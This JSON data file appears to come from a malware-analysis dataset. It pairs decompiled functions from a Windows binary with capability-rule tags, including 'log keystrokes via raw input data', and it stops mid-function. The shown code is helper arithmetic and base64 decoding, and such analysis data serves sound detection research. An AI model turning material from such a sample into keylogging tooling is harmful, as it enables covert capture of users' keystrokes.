{
    "00406c2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406c2f(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0040870b(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "00401040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401040(int32_t arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    var_ch = 0xf;\n    var_10h = 0;\n    var_20h = var_20h & 0xffffff00;\n    fcn.004012f0();\n    var_2ch = in_ECX[4];\n    iVar5 = 0;\n    iVar6 = 0;\n    var_30h = 0;\n    if (var_2ch != 0) {\n        do {\n            var_2ch = var_2ch + -1;\n            puVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n            }\n            if (*(puVar3 + var_30h) == '=') break;\n            puVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n            }\n            var_24h._0_1_ = *(puVar3 + var_30h);\n            iVar2 = fcn.00407279(var_24h);\n            if (((iVar2 == 0) && (var_24h != 0x2b)) && (var_24h != 0x2f)) break;\n            puVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar3 = *in_ECX;\n            }\n            *(&var_28h + iVar5) = *(puVar3 + var_30h);\n            iVar5 = iVar5 + 1;\n            var_30h = var_30h + 1;\n            if (iVar5 == 4) {\n                iVar5 = 0;\n                do {\n                    var_24h._0_1_ = *(&var_28h + iVar5);\n                    uVar1 = fcn.00401270(&var_20h);\n                    *(&var_28h + iVar5) = uVar1;\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 4);\n                uVar4 = var_28h >> 8;\n                *(arg_8h + iVar6) = (uVar4 >> 4 & 3) + var_28h * '\\x04';\n                *(arg_8h + 1 + iVar6) = var_28h._2_1_ >> 2 & 0xf ^ uVar4 << 4;\n                *(arg_8h + 2 + iVar6) = var_28h._2_1_ * '@' + var_28h._3_1_;\n                iVar6 = iVar6 + 3;\n                iVar5 = 0;\n            }\n        } while (var_2ch != 0);\n        if (iVar5 != 0) {\n            if (iVar5 < 4) {\n                fcn.0040c5d0(&var_28h + iVar5, 0, 4 - iVar5);\n            }\n            var_2ch = 0;\n            do {\n                var_24h._0_1_ = *(&var_28h + var_2ch);\n                uVar1 = fcn.00401270(&var_20h);\n                *(&var_28h + var_2ch) = uVar1;\n                var_2ch = var_2ch + 1;\n            } while (var_2ch < 4);\n            uVar4 = var_28h >> 8;\n            var_30h._0_3_ =\n                 CONCAT12(var_28h._2_1_ * '@' + var_28h._3_1_, \n                          CONCAT11(var_28h._2_1_ >> 2 & 0xf ^ uVar4 << 4, (uVar4 >> 4 & 3) + var_28h * '\\x04'));\n            var_30h = var_30h & 0xff000000 | var_30h;\n            if (0 < iVar5 + -1) {\n                fcn.0040d0f0(arg_8h + iVar6, &var_30h, iVar5 + -1);\n            }\n        }\n    }\n    if (0xf < var_ch) {\n        fcn.004072a9(var_20h);\n    }\n    fcn.00406bb6(in_ECX);\n    return;\n}\n",
        "token_count": 1137
    },
    "00401270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401270(uint8_t **arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t *unaff_EBX;\n    uint8_t **ppuVar3;\n    \n    puVar1 = arg_8h[4];\n    if ((puVar1 != NULL) && (puVar1 != NULL)) {\n        ppuVar3 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            ppuVar3 = *arg_8h;\n        }\n        puVar2 = fcn.00407070(ppuVar3, *unaff_EBX, puVar1);\n        while (puVar2 != NULL) {\n            if ((*puVar2 - *unaff_EBX == 0) || ((*puVar2 - *unaff_EBX >> 0x1f | 1U) == 0)) {\n                if (0xf < arg_8h[5]) {\n                    arg_8h = *arg_8h;\n                }\n                return puVar2 - arg_8h;\n            }\n            puVar1 = puVar1 + ppuVar3 + (-1 - puVar2);\n            ppuVar3 = puVar2 + 1;\n            puVar2 = fcn.00407070(ppuVar3, *unaff_EBX, puVar1);\n        }\n    }\n    return -1;\n}\n",
        "token_count": 320
    },
    "00402170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402170(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint8_t *unaff_ESI;\n    uint var_4h;\n    \n    piVar4 = param_2 + 1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar4 = 0;\n        piVar4 = piVar4 + 1;\n    }\n    uVar3 = in_EAX & 3;\n    *param_2 = in_EAX >> 2;\n    if (uVar3 != 0) {\n        *param_2 = (in_EAX >> 2) + 1;\n    }\n    if (200 < *param_2) {\n        *param_2 = 200;\n        in_EAX = 800;\n    }\n    iVar2 = in_EAX - 1;\n    if (2 < iVar2) {\n        piVar4 = param_2 + 1;\n        do {\n            *piVar4 = CONCAT31(CONCAT21(CONCAT11(unaff_ESI[iVar2 + -3], unaff_ESI[iVar2 + -2]), unaff_ESI[iVar2 + -1]), \n                               unaff_ESI[iVar2]);\n            iVar2 = iVar2 + -4;\n            piVar4 = piVar4 + 1;\n        } while (2 < iVar2);\n    }\n    if (uVar3 == 1) {\n        uVar3 = *unaff_ESI;\n    }\n    else {\n        if (uVar3 == 2) {\n            uVar3 = *unaff_ESI;\n            uVar1 = unaff_ESI[1];\n        }\n        else {\n            if (uVar3 != 3) goto code_r0x0040222b;\n            uVar3 = CONCAT11(*unaff_ESI, unaff_ESI[1]);\n            uVar1 = unaff_ESI[2];\n        }\n        uVar3 = uVar3 * 0x100 + uVar1;\n    }\n    param_2[*param_2] = uVar3;\ncode_r0x0040222b:\n    iVar2 = *param_2;\n    while ((1 < iVar2 && (param_2[*param_2] == 0))) {\n        iVar2 = *param_2 + -1;\n        *param_2 = iVar2;\n    }\n    return param_2;\n}\n",
        "token_count": 576
    },
    "00402250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402250(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int32_t *unaff_ESI;\n    int32_t *piVar7;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = arg_8h;\n    iVar5 = *in_EAX;\n    piVar7 = unaff_ESI + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar7 = 0;\n        piVar7 = piVar7 + 1;\n    }\n    iVar3 = *arg_8h;\n    *unaff_ESI = 1;\n    if (iVar3 <= iVar5) {\n        iVar3 = iVar5;\n    }\n    *unaff_ESI = iVar3;\n    var_10h = 0;\n    arg_8h = NULL;\n    if (0 < iVar3) {\n        puVar6 = in_EAX + 1;\n        do {\n            uVar1 = *((piVar2 - in_EAX) + puVar6);\n            uVar4 = uVar1 + *puVar6;\n            iVar5 = uVar4 + var_10h;\n            var_10h = CARRY4(uVar1, *puVar6) + CARRY4(uVar4, var_10h);\n            *((unaff_ESI - in_EAX) + puVar6) = iVar5;\n            arg_8h = arg_8h + 1;\n            puVar6 = puVar6 + 1;\n        } while (arg_8h < *unaff_ESI);\n        if ((var_10h != 0) && (*unaff_ESI < 200)) {\n            unaff_ESI[*unaff_ESI + 1] = var_10h;\n            *unaff_ESI = *unaff_ESI + 1;\n        }\n    }\n    iVar5 = *unaff_ESI;\n    while ((1 < iVar5 && (unaff_ESI[*unaff_ESI] == 0))) {\n        iVar5 = *unaff_ESI + -1;\n        *unaff_ESI = iVar5;\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00402310": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402310(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    uint32_t *puVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    bool bVar9;\n    uint32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar8 = arg_8h;\n    iVar4 = *in_EAX;\n    piVar7 = in_EDX + 1;\n    for (iVar5 = 200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar7 = 0;\n        piVar7 = piVar7 + 1;\n    }\n    iVar5 = *arg_8h;\n    *in_EDX = 1;\n    if (iVar5 <= iVar4) {\n        iVar5 = iVar4;\n    }\n    *in_EDX = iVar5;\n    var_10h = 0;\n    arg_8h = NULL;\n    if (0 < iVar5) {\n        puVar6 = in_EAX + 1;\n        do {\n            uVar1 = *((piVar8 - in_EAX) + puVar6);\n            uVar3 = uVar1 - *puVar6;\n            uVar2 = -(uVar1 < *puVar6);\n            uVar1 = uVar3 < var_10h;\n            *((in_EDX - in_EAX) + puVar6) = uVar3 - var_10h;\n            bVar9 = -1 < uVar2 - uVar1;\n            if ((uVar2 != uVar1 && bVar9) || (bVar9)) {\n                var_10h = 0;\n            }\n            else {\n                var_10h = 1;\n            }\n            arg_8h = arg_8h + 1;\n            puVar6 = puVar6 + 1;\n        } while (arg_8h < *in_EDX);\n        if (var_10h != 0) {\n            iVar4 = *in_EDX;\n            if (iVar4 < 200) {\n                piVar8 = in_EDX + iVar4 + 1;\n                for (iVar5 = 200 - iVar4; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *piVar8 = -1;\n                    piVar8 = piVar8 + 1;\n                }\n            }\n            *in_EDX = 200;\n            goto code_r0x004023d0;\n        }\n    }\n    if (*in_EDX < 2) {\n        return;\n    }\ncode_r0x004023d0:\n    do {\n        if (in_EDX[*in_EDX] != 0) {\n            return;\n        }\n        iVar4 = *in_EDX + -1;\n        *in_EDX = iVar4;\n    } while (1 < iVar4);\n    return;\n}\n",
        "token_count": 696
    },
    "00402470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_330h\n\nvoid __fastcall fcn.00402470(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t *unaff_ESI;\n    uint *puVar5;\n    int32_t *piVar6;\n    int32_t var_330h;\n    uint var_32ch;\n    uint32_t auStack812 [201];\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    var_330h = *param_1;\n    if ((var_330h == 1) && (param_1[1] == 0)) {\n        iVar2 = 0;\n        puVar5 = &var_32ch;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        piVar6 = unaff_ESI + 1;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        *unaff_ESI = 1;\n        puVar4 = unaff_ESI + 1;\n        do {\n            *puVar4 = auStack812[iVar2 + -1];\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 1;\n        } while (iVar2 < *unaff_ESI);\n        fcn.00406bb6(1);\n        return;\n    }\n    iVar2 = 0;\n    puVar5 = &var_32ch;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (0 < var_330h) {\n        puVar4 = param_1 + 1;\n        do {\n            auStack812[iVar2 + -1] = *puVar4;\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 1;\n        } while (iVar2 < var_330h);\n    }\n    iVar2 = 0;\n    puVar4 = param_1 + 1;\n    do {\n        auStack812[iVar2 + -1] = ~*puVar4;\n        iVar2 = iVar2 + 1;\n        puVar4 = puVar4 + 1;\n    } while (iVar2 < 200);\n    iVar2 = 0;\n    do {\n        if (199 < iVar2) break;\n        uVar1 = auStack812[iVar2 + -1];\n        auStack812[iVar2 + -1] = uVar1 + 1;\n        iVar2 = iVar2 + 1;\n    } while (0xfffffffe < uVar1);\n    var_330h = 200;\n    do {\n        if ((&var_330h)[var_330h] != 0) break;\n        var_330h = var_330h + -1;\n    } while (1 < var_330h);\n    iVar2 = 0;\n    piVar6 = unaff_ESI + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    *unaff_ESI = var_330h;\n    if (0 < var_330h) {\n        puVar4 = unaff_ESI + 1;\n        do {\n            *puVar4 = auStack812[iVar2 + -1];\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 1;\n        } while (iVar2 < *unaff_ESI);\n    }\n    fcn.00406bb6(var_330h);\n    return;\n}\n",
        "token_count": 925
    },
    "004025d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_350h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004025d0(int32_t *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    bool bVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    ulong uVar8;\n    uint32_t in_stack_00000328;\n    int32_t in_stack_0000032c;\n    uint32_t in_stack_0000064c;\n    int32_t var_350h;\n    uint var_344h;\n    int32_t *var_340h;\n    int32_t var_33ch;\n    uint var_338h;\n    char var_332h;\n    int32_t var_331h;\n    uint var_32ch;\n    int32_t var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    var_331h._0_1_ = '\\0';\n    var_332h = '\\0';\n    if ((in_stack_00000328 & 0x80000000) != 0) {\n        var_331h._0_1_ = '\\x01';\n        puVar2 = fcn.00402470();\n        puVar5 = &arg_ch;\n        for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if ((in_stack_0000064c & 0x80000000) != 0) {\n        var_332h = '\\x01';\n        puVar2 = fcn.00402470();\n        puVar5 = &stack0x0000032c;\n        for (iVar3 = 0xc9; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    puVar2 = &var_32ch;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    stack0xfffffccc = 1;\n    var_33ch = 0;\n    if (0 < arg_ch) {\n        var_340h = &var_32ch + in_stack_0000032c;\n        iVar3 = in_stack_0000032c;\n        do {\n            iVar6 = 0;\n            if (((&arg_10h)[var_33ch] != 0) && (var_350h = 0,  0 < in_stack_0000032c)) {\n                puVar4 = &var_32ch + var_33ch;\n                in_stack_0000032c = iVar3;\n                do {\n                    uVar8 = fcn.00410110();\n                    var_350h = (uVar8 >> 0x20) + CARRY4(uVar8, *puVar4);\n                    *puVar4 = uVar8 + *puVar4;\n                    iVar6 = iVar6 + 1;\n                    puVar4 = puVar4 + 1;\n                } while (iVar6 < in_stack_0000032c);\n                iVar3 = in_stack_0000032c;\n                if (var_350h != 0) {\n                    *var_340h = var_350h;\n                }\n            }\n            var_340h = var_340h + 1;\n            var_33ch = var_33ch + 1;\n        } while (var_33ch < arg_ch);\n    }\n    unique0x00002000 = in_stack_0000032c + arg_ch;\n    if (unique0x00002000 < 0xc9) goto joined_r0x0040274e;\n    stack0xfffffccc = 200;\n    do {\n        if (*(&var_331h + stack0xfffffccc * 4 + 1) != 0) break;\n        *0x8 = stack0xfffffccc + -1;\njoined_r0x0040274e:\n    } while (1 < unique0x1000013e);\n    if (var_10h < 0) {\n        if (var_331h != var_332h) {\n            if (var_10h == -0x80000000) {\n                iVar3 = 0;\n                if (stack0xfffffccc == 1) {\n                    piVar7 = arg_8h;\n                    for (iVar6 = 200; piVar7 = piVar7 + 1,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *piVar7 = 0;\n                    }\n                    *arg_8h = 1;\n                    piVar7 = arg_8h;\n                    do {\n                        piVar7 = piVar7 + 1;\n                        *piVar7 = (&var_32ch)[iVar3];\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < *arg_8h);\n                    fcn.00406bb6(var_350h);\n                    return;\n                }\n                if (0 < stack0xfffffccc + -1) {\n                    bVar1 = true;\n                    do {\n                        if (!bVar1) goto code_r0x00402844;\n                        if ((&var_32ch)[iVar3] != 0) {\n                            bVar1 = false;\n                        }\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < stack0xfffffccc + -1);\n                    if (!bVar1) goto code_r0x00402844;\n                }\n                iVar3 = 0;\n                piVar7 = arg_8h;\n                for (iVar6 = 200; piVar7 = piVar7 + 1,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *piVar7 = 0;\n                }\n                *arg_8h = stack0xfffffccc;\n                piVar7 = arg_8h;\n                if (0 < stack0xfffffccc) {\n                    do {\n                        piVar7[1] = (&var_32ch)[iVar3];\n                        iVar3 = iVar3 + 1;\n                        piVar7 = piVar7 + 1;\n                    } while (iVar3 < *arg_8h);\n                    fcn.00406bb6(var_350h);\n                    return;\n                }\n                goto code_r0x004028a2;\n            }\n            goto code_r0x00402844;\n        }\n    }\n    else {\ncode_r0x00402844:\n        if (var_331h != var_332h) {\n            fcn.00402470();\n            fcn.00406bb6(var_350h);\n            return;\n        }\n    }\n    iVar3 = 0;\n    piVar7 = arg_8h;\n    for (iVar6 = 200; piVar7 = piVar7 + 1,  iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar7 = 0;\n    }\n    *arg_8h = stack0xfffffccc;\n    piVar7 = arg_8h;\n    if (0 < stack0xfffffccc) {\n        do {\n            piVar7[1] = (&var_32ch)[iVar3];\n            iVar3 = iVar3 + 1;\n            piVar7 = piVar7 + 1;\n        } while (iVar3 < *arg_8h);\n    }\ncode_r0x004028a2:\n    fcn.00406bb6(var_350h);\n    return;\n}\n",
        "token_count": 1785
    },
    "004029b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004029b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0x20;\n    var_4h = arg_ch;\n    if (1 < arg_ch) {\n        piVar2 = arg_8h + -4 + arg_ch * 4;\n        do {\n            if (*piVar2 != 0) break;\n            var_4h = var_4h + -1;\n            piVar2 = piVar2 + -1;\n        } while (1 < var_4h);\n    }\n    iVar1 = var_4h;\n    var_ch = in_ECX;\n    if (0 < in_ECX) {\n        do {\n            if (var_ch < var_8h) {\n                var_8h = var_ch;\n            }\n            iVar4 = 0;\n            uVar5 = 0;\n            if (0 < iVar1) {\n                do {\n                    uVar6 = fcn.004103d0();\n                    uVar3 = uVar6 >> 0x20;\n                    *(arg_8h + iVar4 * 4) = uVar6 | uVar5;\n                    iVar4 = iVar4 + 1;\n                    uVar5 = uVar3;\n                } while (iVar4 < var_4h);\n                iVar1 = var_4h;\n                if ((uVar3 != 0) && (iVar4 = var_4h + 1,  iVar4 <= arg_ch)) {\n                    *(arg_8h + var_4h * 4) = uVar3;\n                    iVar1 = iVar4;\n                    var_4h = iVar4;\n                }\n            }\n            var_ch = var_ch - var_8h;\n        } while (0 < var_ch);\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "00402a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x20;\n    if (1 < arg_ch) {\n        piVar2 = arg_8h + -4 + arg_ch * 4;\n        do {\n            if (*piVar2 != 0) break;\n            arg_ch = arg_ch + -1;\n            piVar2 = piVar2 + -1;\n        } while (1 < arg_ch);\n    }\n    var_ch = in_ECX;\n    if (0 < in_ECX) {\n        do {\n            if (var_ch < var_4h) {\n                var_4h = var_ch;\n            }\n            iVar3 = arg_ch + -1;\n            var_18h = 0;\n            while (-1 < iVar3) {\n                uVar1 = fcn.004103f0();\n                uVar1 = uVar1 | var_18h;\n                var_18h = fcn.004103d0();\n                iVar3 = iVar3 + -1;\n                *(arg_8h + 4 + iVar3 * 4) = uVar1;\n            }\n            var_ch = var_ch - var_4h;\n        } while (0 < var_ch);\n    }\n    if (1 < arg_ch) {\n        piVar2 = arg_8h + -4 + arg_ch * 4;\n        do {\n            if (*piVar2 != 0) {\n                return;\n            }\n            arg_ch = arg_ch + -1;\n            piVar2 = piVar2 + -1;\n        } while (1 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00402c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_654h_2\n// WARNING: Variable defined which should be unmapped: var_650h_2\n// WARNING: Removing unreachable block (ram,0x00402e56)\n\nvoid fcn.00402c50(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *arg_8h;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *extraout_ECX;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t extraout_ECX_00;\n    uint unaff_EBP;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    bool bVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    int32_t var_8h_2;\n    uint var_ch;\n    uint var_654h;\n    uint var_650h;\n    int32_t var_32ch_3;\n    uint var_330h;\n    uint var_32ch;\n    int32_t *var_32ch_2;\n    uint var_8h;\n    uint *var_1010h_2;\n    uint var_100ch_2;\n    uint *var_ff4h_2;\n    uint var_ff0h_2;\n    int32_t var_fech_2;\n    uint *var_fd8h_2;\n    uint *var_fd4h_2;\n    uint var_fd0h_2;\n    uint var_fcch;\n    uint var_ffch_2;\n    uint var_ca4h_2;\n    uint var_ca0h;\n    uint var_101ch;\n    uint var_1010h;\n    uint var_100ch;\n    uint var_1000h;\n    uint var_ffch;\n    uint var_ff8h;\n    uint var_ff4h;\n    int32_t var_ff0h;\n    uint var_fech;\n    uint var_fe8h;\n    uint var_fe4h;\n    uint var_fe0h;\n    uint var_fdch;\n    uint var_fd8h;\n    uint var_fd4h;\n    uint var_fd0h;\n    uint32_t var_65ch;\n    int32_t var_654h_2;\n    uint var_650h_2;\n    uint var_ca4h;\n    int32_t var_334h;\n    int32_t iStack820;\n    int32_t aiStack816 [197];\n    \n    fcn.0040f990();\n    iVar9 = var_8h_2 + 1;\n    puVar5 = &stack0xfffffcd0;\n    for (iVar7 = 200; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    arg_8h = fcn.00406bab();\n    iVar7 = iVar9;\n    puVar5 = arg_8h;\n    if (0 < iVar9) {\n        for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    iVar7 = 0;\n    uVar4 = 0x80000000;\n    var_fech_2 = 0;\n    do {\n        if ((uVar4 & (&fcn.00402c50::var_32ch_3)[var_32ch_3]) != 0) break;\n        iVar7 = iVar7 + 1;\n        uVar4 = uVar4 >> 1;\n    } while (uVar4 != 0);\n    if (0 < var_8h_2) {\n        iVar8 = 0;\n        puVar5 = arg_8h;\n        do {\n            *puVar5 = *((&fcn.00402c50::var_ch - arg_8h) + puVar5);\n            iVar8 = iVar8 + 1;\n            puVar5 = puVar5 + 1;\n        } while (iVar8 < var_8h_2);\n    }\n    fcn.004029b0(arg_8h, iVar9);\n    aiStack816[196] = 0x402d3b;\n    puVar5 = fcn.004028c0(iVar7);\n    puVar6 = &fcn.00402c50::var_32ch_3;\n    for (iVar7 = 0xc9; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    uVar4 = (&fcn.00402c50::var_32ch_3)[var_32ch_3];\n    iVar7 = var_32ch_3 + 1;\n    var_1010h_2 = iVar9 - var_32ch_3;\n    puVar6 = fcn.00406bab();\n    iVar8 = iVar7;\n    puVar5 = puVar6;\n    if (0 < iVar7) {\n        for (; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    if (0 < var_1010h_2) {\n        var_fd8h_2 = arg_8h + var_8h_2;\n        var_ff4h_2 = var_1010h_2;\n        do {\n            aiStack816[195] = 0x402df4;\n            uVar13 = fcn.0040ee50();\n            uVar10 = extraout_ECX_00;\n            do {\n                if (uVar13 != 0x100000000) {\n                    uVar1 = var_fd8h_2[-2];\n                    aiStack816[195] = 0x402e50;\n                    uVar14 = fcn.00410110();\n                    if (uVar14 <= CONCAT44(uVar10, uVar1)) break;\n                }\n                uVar13 = uVar13 - 1;\n                bVar12 = CARRY4(uVar10, uVar4);\n                uVar10 = uVar10 + uVar4;\n                var_1010h_2 = var_1010h_2 + bVar12;\n            } while (var_1010h_2 